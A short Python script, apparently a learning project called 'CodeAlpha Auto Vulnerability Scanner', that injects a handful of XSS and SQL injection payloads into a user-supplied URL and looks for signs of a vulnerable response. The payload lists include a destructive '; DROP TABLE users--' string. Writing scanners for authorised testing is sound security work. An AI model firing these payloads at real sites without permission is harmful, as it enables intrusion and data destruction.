import argparse
import requests
from urllib.parse import urlparse, parse_qs

# Payloads (example ones)
xss_payloads = ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"]
sqli_payloads = ["' OR '1'='1", "'; DROP TABLE users--", "\" OR \"1\"=\"1"]

def scan_xss(url):
    print(f"[XSS] Scanning {url} with {len(xss_payloads)} payloads...")
    for payload in xss_payloads:
        test_url = url.replace("test", payload)
        try:
            r = requests.get(test_url, timeout=5)
            if payload in r.text:
                print(f"[VULNERABLE] XSS found with payload: {payload}")
                return
        except Exception as e:
            print(f"[ERROR] {e}")
    print("[INFO] No XSS vulnerabilities found.")

def scan_sqli(url):
    print(f"[SQLi] Scanning {url} with {len(sqli_payloads)} payloads...")
    for payload in sqli_payloads:
        test_url = url.replace("1", payload)
        try:
            r = requests.get(test_url, timeout=5)
            if "sql" in r.text.lower() or "syntax" in r.text.lower():
                print(f"[VULNERABLE] SQL Injection found with payload: {payload}")
                return
        except Exception as e:
            print(f"[ERROR] {e}")
    print("[INFO] No SQLi vulnerabilities found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CodeAlpha Auto Vulnerability Scanner")
    parser.add_argument("-u", "--url", help="Target URL with parameters", required=False)
    parser.add_argument("--scan", choices=["xss", "sqli", "all"], default="all", help="Type of scan")
    args = parser.parse_args()

    # Agar URL CLI se nahi diya ho to input le
    if args.url:
        target_url = args.url
    else:
        target_url = input("Enter target URL: ").strip()

    if args.scan == "xss":
        scan_xss(target_url)
    elif args.scan == "sqli":
        scan_sqli(target_url)
    elif args.scan == "all":
        scan_xss(target_url)
        scan_sqli(target_url)
